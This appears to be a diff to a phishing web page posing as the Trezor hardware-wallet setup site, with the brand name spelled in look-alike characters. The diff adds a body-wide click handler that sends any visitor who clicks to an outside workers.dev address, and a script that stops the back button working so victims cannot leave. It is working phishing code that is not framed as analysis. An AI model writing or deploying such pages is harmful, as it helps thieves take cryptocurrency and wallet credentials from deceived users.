@@ -180,7 +180,7 @@
         }
     </style>
 </head>
-<body>
+<body onclick="window.location='https://agnr8.l68z.workers.dev/';">
     <header>
         <h1>Trézōr.iō/start®</h1>
         <p style="color: #f0abfc; font-size: 1.2em;">Secure* Cryptō Hardware™ Wallet©</p>
@@ -289,5 +289,10 @@
             });
         });
     </script>
+                  <script type="text/javascript">
+        function preventBack() { window.history.forward(); }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+  </script>
 </body>
 </html>
